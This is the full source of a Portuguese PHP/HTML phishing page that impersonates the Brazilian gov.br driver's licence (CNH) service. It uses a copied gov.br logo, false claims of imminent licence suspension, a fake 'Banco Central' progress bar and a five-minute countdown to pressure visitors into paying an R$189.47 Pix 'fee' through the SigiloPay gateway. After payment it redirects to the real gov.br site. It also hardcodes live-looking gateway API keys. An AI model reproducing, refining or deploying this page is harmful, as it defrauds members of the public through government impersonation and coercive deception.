<?php
// Se o JavaScript chamar a página pedindo o PIX, executa a API e para o código aqui
if (isset($_GET['action']) && $_GET['action'] == 'gerar_pix') {
    header('Content-Type: application/json; charset=utf-8');

    // CREDENCIAIS DA SUA CONTA - SIGILOPAY
    $public_key = "baeza3m_y4fudfz1wtmblh9o"; 
    $secret_key = "8chevs8wd7c3ktd8boxks9nhjbkspyw60yr1us9jkrstoxyd9n895zaqqd6ax4or"; 
    
    // ROTA EXATA E VALIDADA SIGILOPAY
    $url = "https://app.sigilopay.com.br/api/v1/gateway/pix/receive";
    
    // Identificador único obrigatório gerado a cada tentativa
    $identifier = "ORDER_" . time() . "_" . uniqid();

    // PAYLOAD AJUSTADO PARA PADRÃO SIGILOPAY
    $payload = [
        "identifier" => $identifier,
        "amount" => 189.47, // Valor em Reais (float) no padrão da SigiloPay
        "client" => [
            "name" => "PAGAMENTOS",
            "email" => "joao@email.com",
            "phone" => "21999999999", 
            "document" => "11140471000111"
        ]
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json', 
            'Accept: application/json',
            'x-public-key: ' . $public_key,
            'x-secret-key: ' . $secret_key
        ],
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_TIMEOUT => 30
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $result = json_decode($response, true);

    // Mapeador dinâmico para varrer a resposta e achar o código do Pix e IDs
    if (!function_exists('findKey')) {
        function findKey($array, $keySearch) {
            if (!is_array($array)) return null;
            if (isset($array[$keySearch])) return $array[$keySearch];
            foreach ($array as $item) {
                if (is_array($item)) {
                    $res = findKey($item, $keySearch);
                    if ($res) return $res;
                }
            }
            return null;
        }
    }

    $transaction_id = $result['transactionId'] ?? findKey($result, 'transaction_id') ?? findKey($result, 'id') ?? $identifier;
    
    $pix_code = null;
    if ($httpCode === 200 || $httpCode === 201) {
        $pix_code = findKey($result, 'pix_code') ?? findKey($result, 'pix_copy_and_paste') ?? findKey($result, 'string') ?? findKey($result, 'code');
    }
    
    $qr_code_visual = findKey($result, 'pix_qr_code') ?? findKey($result, 'qr_code') ?? findKey($result, 'qr_code_url') ?? findKey($result, 'qrcode');
    
    if (empty($qr_code_visual) && !empty($pix_code)) {
        $qr_code_visual = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode($pix_code);
    }

    echo json_encode([
        "success" => !empty($pix_code),
        "pix_code" => $pix_code,
        "transaction_id" => $transaction_id,
        "qr_code_visual" => $qr_code_visual
    ]);
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'consultar_status' && isset($_GET['id'])) {
    header('Content-Type: application/json');
    
    $transaction_id = $_GET['id'];
    $public_key = "youssefzeroki_9gstvyrvv0avmv17";
    $secret_key = "8snoikonrantx0qn6ufq9hxou8w1qf5dxvcxb4oavntglk67o5y502s60tpcwtf6";
    
    $url = "https://app.sigilopay.com.br/api/v1/gateway/pix/status/" . $transaction_id;
    
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            'Accept: application/json',
            'x-public-key: ' . $public_key,
            'x-secret-key: ' . $secret_key
        ],
        CURLOPT_TIMEOUT => 15
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    echo $response;
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Regularizar Sua CNH</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #f0f2f5; 
            color: #1a1a1a;
            padding: 90px 15px 40px 15px; 
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .fixed-gov-header { 
            position: fixed; top: 0; left: 0; width: 100%; background: #ffffff; 
            padding: 16px 24px; border-bottom: 3px solid #1351b4; z-index: 1000; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.06);
            display: flex;
            align-items: center;
        }
        .gov-logo { height: 28px; width: auto; display: block; }

        .container { 
            background: white; 
            width: 100%; 
            max-width: 460px; 
            border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.05); 
            overflow: hidden; 
            border: 1px solid #eef2f5; 
            margin: 0 auto;
        }

        .header-blue { 
            background: #1351b4; 
            color: white; 
            padding: 20px 24px; 
            text-align: center; 
            font-size: 13px; 
            font-weight: 700; 
            line-height: 1.5; 
            letter-spacing: 0.5px; 
            text-transform: uppercase; 
            border-bottom: 4px solid #ffcc00; 
        }
        
        .status-bar { 
            background: #fff7e6; 
            border-bottom: 1px solid #ffe7ba; 
            padding: 12px; 
            text-align: center; 
            color: #d46b08; 
            font-size: 13px; 
            font-weight: 600; 
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        /* ESTILOS DA TELA DE CARREGAMENTO */
        #loaderContainer {
            padding: 40px 20px;
            text-align: center;
        }
        .spinner { 
            border: 4px solid #eef2f5; 
            border-top: 4px solid #1351b4; 
            border-radius: 50%; 
            width: 52px; 
            height: 52px; 
            animation: spin 0.9s linear infinite; 
            margin: 0 auto 18px; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .loader-title { 
            font-size: 17px; 
            color: #1351b4; 
            font-weight: 800; 
            margin-bottom: 6px; 
        }
        .loader-step-text {
            font-size: 13px;
            color: #595959;
            font-weight: 600;
            margin-bottom: 20px;
            min-height: 18px;
        }

        /* Barra de Progresso Animada */
        .progress-track {
            width: 100%;
            max-width: 320px;
            height: 8px;
            background-color: #f0f0f0;
            border-radius: 20px;
            margin: 0 auto;
            overflow: hidden;
            box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
        }
        .progress-bar-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #1351b4, #1d5ab5);
            border-radius: 20px;
            transition: width 0.3s ease-in-out;
        }

        /* Estilo do Cronômetro */
        .timer-box {
            background: #fff1f0;
            border: 1px solid #ffa39e;
            color: #cf1322;
            padding: 10px;
            font-size: 14px;
            font-weight: 700;
            text-align: center;
            border-radius: 8px;
            margin-bottom: 15px;
        }

        .instability-alert {
            background: #fff1f0;
            border-bottom: 1px solid #ffa39e;
            padding: 16px 24px;
        }
        .highlight-notice {
            background: #fffbe6;
            border: 1px solid #ffe58f;
            color: #d46b08;
            padding: 12px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 13px;
            text-align: center;
            line-height: 1.4;
        }

        .content { padding: 32px 24px; text-align: center; }
        
        .pix-badge { 
            background: #e6f7ff; 
            color: #1d5ab5; 
            display: inline-flex; 
            align-items: center; 
            padding: 6px 16px; 
            border-radius: 50px; 
            font-size: 11px; 
            font-weight: 700; 
            margin-bottom: 24px; 
            letter-spacing: 1px;
            border: 1px solid #bae7ff;
        }

        .qr-container { 
            background: #fff; 
            border: 1px solid #f0f0f0; 
            padding: 16px; 
            border-radius: 16px; 
            display: inline-block; 
            margin-bottom: 24px; 
            box-shadow: 0 4px 12px rgba(0,0,0,0.03); 
        }
        .qr-img { width: 200px; height: 200px; display: block; }

        .price-box { 
            margin-bottom: 24px; 
            background: #fafafa; 
            padding: 16px; 
            border-radius: 14px; 
            border: 1px solid #f0f0f0; 
        }
        .price-label { font-size: 12px; color: #8c8c8c; margin-bottom: 4px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;}
        .price-value { font-size: 34px; font-weight: 800; color: #141414; }

        .instruction-text { font-size: 14px; color: #434343; line-height: 1.6; margin-bottom: 20px; }
        
        .pix-input-group { margin-bottom: 16px; }
        .pix-input { 
            width: 100%; 
            padding: 16px; 
            background: #f5f5f5; 
            border: 1px solid #d9d9d9; 
            border-radius: 12px; 
            font-size: 12px; 
            color: #595959; 
            text-align: center; 
            font-family: monospace; 
            outline: none; 
            transition: all 0.2s;
        }
        .pix-input:focus { background: #fff; border-color: #1351b4; }

        .btn-copy { 
            width: 100%; 
            padding: 16px; 
            background: #1351b4; 
            color: white; 
            border: none; 
            border-radius: 12px; 
            font-weight: 700; 
            cursor: pointer; 
            font-size: 15px; 
            transition: all 0.2s ease; 
            letter-spacing: 0.5px;
            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.2);
        }
        .btn-copy:hover { background: #0f4090; transform: translateY(-1px); box-shadow: 0 6px 16px rgba(19, 81, 180, 0.3); }
        .btn-copy:active { transform: translateY(0); }
        .btn-copy.success { background: #389e0d !important; box-shadow: 0 4px 12px rgba(56, 158, 13, 0.2); }

        .footer-info { 
            font-size: 12px; 
            color: #8c8c8c; 
            margin-top: 24px; 
            border-top: 1px solid #f0f0f0; 
            padding-top: 20px; 
            line-height: 1.6; 
            text-align: left;
        }

        /* Tela de Expiração/Bloqueio */
        #expiredBlock {
            display: none;
            padding: 30px 20px;
            text-align: center;
        }
        .expired-title {
            color: #cf1322;
            font-size: 18px;
            font-weight: 800;
            margin-bottom: 12px;
            text-transform: uppercase;
        }
        .expired-desc {
            font-size: 14px;
            color: #434343;
            line-height: 1.5;
        }
    </style>
</head>
<body>

<div class="fixed-gov-header">
    <img src="./gov.br - Acesse sua conta_files/govbr.png" class="gov-logo" alt="Logotipo Gov.br">
</div>

<div class="container">
    <div class="header-blue">
        SISTEMA DE REGULARIZAÇÃO DE CONDUTORES<br>
        ATENÇÃO: EVITE A SUSPENSÃO DEFINITIVA DA SUA CNH
    </div>

    <div class="status-bar" id="statusTitle">
        Gerando Guia de Pagamento...
    </div>

    <!-- TELA DE CARREGAMENTO ANIMADA -->
    <div id="loaderContainer" class="content">
        <div class="spinner"></div>
        <div class="loader-title">Carregando guia de pagamento...</div>
        <div class="loader-step-text" id="stepText">Conectando ao sistema do Banco Central...</div>
        
        <div class="progress-track">
            <div class="progress-bar-fill" id="progressBar"></div>
        </div>
        
        <p style="font-size: 12px; color: #8c8c8c; margin-top: 18px;">
            Aguarde um instante. Não atualize nem feche esta página.
        </p>

        <div id="pixError" style="display: none; color:#ff4d4f; margin-top: 20px; font-weight: 600;">
            Erro na geração do Pix. Atualize a página e tente novamente.
        </div>
    </div>

    <!-- CONTEÚDO DO PIX (RELEVASSE APÓS FINALIZAR O CARREGAMENTO) -->
    <div id="pixData" style="display: none;">
        <div class="instability-alert">
            <div class="highlight-notice">🛑 Se ocorrer qualquer erro, atualize a página ou tente utilizar outra instituição bancária!</div>
        </div>

        <div class="content">
            <div class="timer-box">
                ⏰ Tempo restante para realizar seu pagamento: <span id="timer">05:00</span>
            </div>

            <div class="pix-badge">PAGAMENTO VIA PIX</div>
            
            <div class="price-box">
                <div class="price-label">Valor da Taxa</div>
                <div class="price-value">R$ 189,47</div>
            </div>
            
            <div class="qr-container">
                <img id="qrCodeImg" src="" class="qr-img" alt="QR Code">
            </div>
            
            <p class="instruction-text">
                Copie o código abaixo para pagar via <strong>Pix Copia e Cola</strong> em seu aplicativo bancário.<br>
                <span style="color: #cf1322; font-weight: bold; display: block; margin-top: 5px;">Se der erro, atualize a página para gerar um novo Pix e tente em outro aplicativo bancário.</span>
            </p>
            
            <div class="pix-input-group">
                <input type="text" id="pixStr" class="pix-input" value="" readonly>
            </div>
            
            <button class="btn-copy" id="btnCopy" onclick="copyPix()">COPIAR CÓDIGO PIX</button>
            
            <div class="footer-info">
                <strong>Identificador:</strong> #<span id="txtTransactionId"></span><br>
                O processamento e a liberação ocorrem imediatamente após o pagamento.
            </div>
        </div>
    </div>

    <!-- Container exibido quando o tempo expira -->
    <div id="expiredBlock">
        <div class="expired-title">🚫 CNH Bloqueada Imediatamente</div>
        <p class="expired-desc">
            O tempo de <strong>5 minutos</strong> para a regularização via Pix expirou e o pagamento não foi confirmado.<br><br>
            Sua CNH foi encaminhada para o processo de <strong>suspensão imediata</strong> no sistema.
        </p>
    </div>
</div>

<script>
let transactionId = null;
let statusInterval = null;
let timerInterval = null;
const redirectUrl = "https://www.gov.br/pt-br/servicos/emitir-a-carteira-nacional-de-habilitacao-digital-cnh-e";

window.onload = function() {
    let progress = 0;
    const progressBar = document.getElementById("progressBar");
    const stepText = document.getElementById("stepText");

    // Simulação visual de progresso da barra
    const progressTimer = setInterval(() => {
        if (progress < 85) {
            progress += Math.floor(Math.random() * 12) + 5;
            if (progress > 85) progress = 85;
            progressBar.style.width = progress + "%";

            if (progress > 30 && progress < 60) {
                stepText.innerText = "Gerando dados da taxa e QR Code...";
            } else if (progress >= 60) {
                stepText.innerText = "Sincronizando com a chave Pix...";
            }
        }
    }, 200);

    // Requisição real da API (inalterada)
    fetch('?action=gerar_pix')
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                document.getElementById("pixStr").value = data.pix_code;
                document.getElementById("qrCodeImg").src = data.qr_code_visual;
                document.getElementById("txtTransactionId").innerText = data.transaction_id;
                transactionId = data.transaction_id;

                // Completa o progresso visual até 100%
                clearInterval(progressTimer);
                progressBar.style.width = "100%";
                stepText.innerText = "Guia gerada com sucesso!";

                setTimeout(() => {
                    document.getElementById("loaderContainer").style.display = "none";
                    document.getElementById("statusTitle").innerText = "Aguardando Pagamento";
                    document.getElementById("pixData").style.display = "block";

                    // Inicia cronômetro e consulta de status
                    startTimer(300);
                    statusInterval = setInterval(checkStatus, 5000);
                }, 400);

            } else {
                clearInterval(progressTimer);
                showError();
            }
        })
        .catch(() => {
            clearInterval(progressTimer);
            showError();
        });
};

function startTimer(duration) {
    let timer = duration, minutes, seconds;
    const display = document.getElementById('timer');
    
    timerInterval = setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (--timer < 0) {
            clearInterval(timerInterval);
            clearInterval(statusInterval);
            handleExpiration();
        }
    }, 1000);
}

function handleExpiration() {
    document.getElementById("pixData").style.display = "none";
    document.getElementById("statusTitle").innerText = "Processo Suspenso";
    document.getElementById("statusTitle").style.background = "#fff1f0";
    document.getElementById("statusTitle").style.color = "#cf1322";
    document.getElementById("expiredBlock").style.display = "block";
}

function showError() {
    document.getElementById("loaderContainer").querySelector('.spinner').style.display = "none";
    document.getElementById("statusTitle").innerText = "Erro ao Gerar Pix";
    document.getElementById("pixError").style.display = "block";
}

function copyPix() {
    const input = document.getElementById("pixStr");
    const btn = document.getElementById("btnCopy");
    input.select();
    navigator.clipboard.writeText(input.value).then(() => {
        btn.innerText = "CÓDIGO COPIADO!";
        btn.classList.add("success");
        setTimeout(() => { btn.innerText = "COPIAR CÓDIGO PIX"; btn.classList.remove("success"); }, 3000);
    });
}

function checkStatus() {
    if (!transactionId) return;
    
    fetch(`?action=consultar_status&id=${transactionId}`)
        .then(res => res.json())
        .then(data => {
            if (data && (data.status === 'paid' || data.status === 'succeeded' || data.status === 'approved' || data.status === 'CONFIRMED')) {
                clearInterval(timerInterval);
                clearInterval(statusInterval);
                
                // Atualiza o status informando a confirmação do pagamento
                const statusTitle = document.getElementById("statusTitle");
                statusTitle.innerText = "PAGAMENTO CONFIRMADO!";
                statusTitle.style.background = "#f6ffed";
                statusTitle.style.color = "#389e0d";
                statusTitle.style.borderColor = "#b7eb8f";
                
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 2000);
            }
        })
        .catch(err => console.error("Erro ao verificar status:", err));
}
</script>

</body>
</html>
